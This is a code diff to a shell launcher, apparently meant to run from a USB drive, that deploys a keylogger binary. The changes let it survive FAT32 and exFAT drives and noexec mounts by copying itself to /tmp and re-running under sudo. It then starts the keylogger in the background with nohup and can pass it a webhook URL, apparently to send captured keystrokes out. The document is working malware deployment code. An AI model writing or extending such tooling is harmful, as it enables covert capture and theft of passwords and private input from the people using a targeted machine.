@@ -24,7 +24,8 @@ if [ ! -f "$BINARY_PATH" ]; then
 fi
 
 # Make the binary executable if it isn't already
-chmod +x "$BINARY_PATH" 2>/dev/null
+# Note: chmod may fail on FAT32/exFAT filesystems, but that's okay
+chmod +x "$BINARY_PATH" 2>/dev/null || true
 
 echo "📍 Script location: $SCRIPT_DIR"
 echo "📦 Binary location: $BINARY_PATH"
@@ -36,8 +37,19 @@ if [ "$EUID" -ne 0 ]; then
     echo "You will be prompted for your password."
     echo ""
     
-    # Re-run this script with sudo
-    exec sudo bash "$0" "$@"
+    # Re-run this script with sudo, using absolute path to work from USB mount points
+    # Copy the script to /tmp first to avoid issues with noexec/nosuid mount options
+    TEMP_SCRIPT="/tmp/usb_autorun_$$.sh"
+    cp "$0" "$TEMP_SCRIPT"
+    chmod +x "$TEMP_SCRIPT"
+    exec sudo bash "$TEMP_SCRIPT" "$SCRIPT_DIR" "$@"
+fi
+
+# If first argument is a directory path, it means we were called from temp script
+if [ -d "$1" ] && [ -n "$1" ]; then
+    SCRIPT_DIR="$1"
+    shift
+    BINARY_PATH="$SCRIPT_DIR/rust-key"
 fi
 
 echo "✅ Running with sudo privileges"
@@ -77,13 +89,24 @@ mkdir -p "$SCRIPT_DIR/logs"
 
 # Run the keylogger with optional webhook URL
 # Log file will be created in the USB drive's logs directory
+# On FAT32/exFAT, we need to explicitly invoke bash/sh to run the binary
 if [ -n "$WEBHOOK_URL" ]; then
-    # Run in background with nohup, redirect output to USB drive
-    nohup "$BINARY_PATH" "$WEBHOOK_URL" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
+    # Try to run the binary directly, fall back to explicit invocation if needed
+    if [ -x "$BINARY_PATH" ]; then
+        nohup "$BINARY_PATH" "$WEBHOOK_URL" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
+    else
+        # FAT32/exFAT may not support execute bit, but binary should still work
+        nohup sh -c "exec '$BINARY_PATH' '$WEBHOOK_URL'" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
+    fi
     KEYLOGGER_PID=$!
 else
-    # Run in background with nohup, redirect output to USB drive
-    nohup "$BINARY_PATH" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
+    # Try to run the binary directly, fall back to explicit invocation if needed
+    if [ -x "$BINARY_PATH" ]; then
+        nohup "$BINARY_PATH" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
+    else
+        # FAT32/exFAT may not support execute bit, but binary should still work
+        nohup sh -c "exec '$BINARY_PATH'" > "$SCRIPT_DIR/logs/keylog.txt" 2>&1 &
+    fi
     KEYLOGGER_PID=$!
 fi
 
@@ -106,6 +129,7 @@ echo "Stopping keylogger (PID: $KEYLOGGER_PID)..."
 sudo kill $KEYLOGGER_PID 2>/dev/null && echo "✅ Keylogger stopped" || echo "❌ Keylogger not found or already stopped"
 EOF
 
-chmod +x "$SCRIPT_DIR/stop_keylogger.sh"
+chmod +x "$SCRIPT_DIR/stop_keylogger.sh" 2>/dev/null || true
 echo "📌 A stop script has been created: $SCRIPT_DIR/stop_keylogger.sh"
+echo "   (Run with: bash $SCRIPT_DIR/stop_keylogger.sh)"
 echo ""
